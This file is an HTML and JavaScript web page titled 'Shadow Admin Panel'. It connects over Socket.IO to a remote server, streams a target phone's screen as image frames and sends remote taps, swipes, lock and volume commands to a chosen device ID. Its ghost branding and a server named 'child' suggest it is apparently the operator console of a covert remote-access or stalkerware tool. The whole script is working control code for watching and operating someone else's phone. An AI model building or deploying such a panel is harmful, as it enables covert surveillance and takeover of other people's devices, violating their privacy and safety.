<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Shadow Admin Panel</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>

    <style>
        :root {
            --bg-color: #050505;
            --panel-bg: #1a1a1a;
            --accent: #00ff88;
            --danger: #ff3333;
            --text-main: #ffffff;
        }

        body {
            margin: 0; background-color: var(--bg-color); color: var(--text-main);
            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
        }

        .top-nav {
            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
            display: flex; justify-content: space-between; align-items: center; z-index: 10;
        }
        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; }
        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); animation: blink 1s infinite; }

        @keyframes blink { 50% { opacity: 0.5; } }

        .screen-container {
            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
        }

        .phone-frame {
            width: 320px; height: 640px; border: 12px solid #222; border-radius: 40px;
            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.8);
            overflow: hidden; display: flex; align-items: center; justify-content: center;
        }
        
        #screenStream { 
            width: 100%; height: 100%; 
            object-fit: contain; /* Phone ki screen poori dikhegi */
            display: none; 
            background: #000;
        }
        
        .offline-msg { position: absolute; color: #666; text-align: center; z-index: 5; }

        .side-panel {
            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
            background: rgba(26, 26, 26, 0.9); padding: 15px; border-radius: 20px; border: 1px solid #333;
        }
        .control-btn {
            width: 55px; height: 55px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.3rem;
        }
        .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }

        .nav-bar {
            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.9);
            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
        }
        .nav-item { color: #888; font-size: 1.3rem; cursor: pointer; }
        .nav-item:hover { color: white; }

        @media (max-width: 768px) {
            .side-panel { position: fixed; bottom: 70px; right: 10px; flex-direction: column; padding: 10px; scale: 0.8; }
        }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW ADMIN</div>
        <div class="status-badge">
            <span class="live-dot" id="dot"></span> 
            <span id="statusText" style="color:#888">Waiting...</span>
        </div>
    </div>

    <div class="screen-container">
        <div class="phone-frame">
            <div id="offlineMsg" class="offline-msg">
                <i class="fa-solid fa-satellite-dish fa-spin fa-3x" style="margin-bottom: 15px; color: var(--accent);"></i>
                <p id="msgText">Establishing Secure Link...</p>
            </div>
            
            <img id="screenStream" src="" alt="Stream" onclick="sendClick(event)">
            
            <div class="nav-bar">
                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
            </div>
        </div>

        <div class="side-panel">
            <div class="control-btn" onclick="sendCommand('lock')" title="Lock"><i class="fa-solid fa-lock"></i></div>
            <div class="control-btn" onclick="sendCommand('volume_up')"><i class="fa-solid fa-plus"></i></div>
            <div class="control-btn" onclick="sendCommand('volume_down')"><i class="fa-solid fa-minus"></i></div>
            <div class="control-btn" onclick="sendCommand('swipe_up')"><i class="fa-solid fa-arrow-up"></i></div>
            <div class="control-btn" onclick="sendCommand('swipe_down')"><i class="fa-solid fa-arrow-down"></i></div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        let socket = null;
        let currentDeviceId = null;

        const streamImg = document.getElementById('screenStream');
        const offlineBox = document.getElementById('offlineMsg');
        const statusTxt = document.getElementById('statusText');
        const dot = document.getElementById('dot');

        window.addEventListener('load', () => {
            const urlParams = new URLSearchParams(window.location.search);
            currentDeviceId = urlParams.get('id');

            if (currentDeviceId) {
                connectToSystem();
            } else {
                alert("Device ID missing in URL! Example: ?id=12345");
            }
        });

        function connectToSystem() {
            socket = io(SERVER_URL, { 
                reconnection: true,
                transports: ['websocket'] // Stream ke liye websocket fast hota hai
            });

            socket.on("connect", () => {
                statusTxt.innerText = "Online: " + currentDeviceId;
                statusTxt.style.color = "var(--accent)";
                dot.classList.add("active");
                
                // Server ko batana ki main is device ka Admin hoon
                socket.emit("join-web", currentDeviceId); 
            });

            // ðŸ”¥ SABSE ZAROORI: Image Receive Karna
            // Note: Humne display-frame event use kiya hai jo tumhare server me tha
            socket.on("display-frame", (data) => {
                if (data.id === currentDeviceId || data.deviceId === currentDeviceId) {
                    offlineBox.style.display = "none";
                    streamImg.style.display = "block";
                    
                    // Base64 image ko source me set karna
                    streamImg.src = "data:image/jpeg;base64," + data.frame;
                }
            });

            socket.on("disconnect", () => {
                statusTxt.innerText = "Reconnecting...";
                dot.classList.remove("active");
                offlineBox.style.display = "flex";
                streamImg.style.display = "none";
            });
        }

        function sendCommand(action) {
            if(!socket || !socket.connected) return;
            
            // Vibration for feedback
            if(navigator.vibrate) navigator.vibrate(30);

            // Server ko command bhejna
            socket.emit("admin-command", {
                device_id: currentDeviceId,
                command: action
            });
        }

        function sendClick(event) {
            if(!socket || !socket.connected) return;

            const rect = streamImg.getBoundingClientRect();
            // Coordinates calculation (Screen ke size ke hisab se)
            const x = Math.round(((event.clientX - rect.left) / rect.width) * 1000);
            const y = Math.round(((event.clientY - rect.top) / rect.height) * 1000);

            socket.emit("admin-command", {
                device_id: currentDeviceId,
                command: "CLICK",
                x: x, y: y
            });
        }
    </script>
</body>
</html>
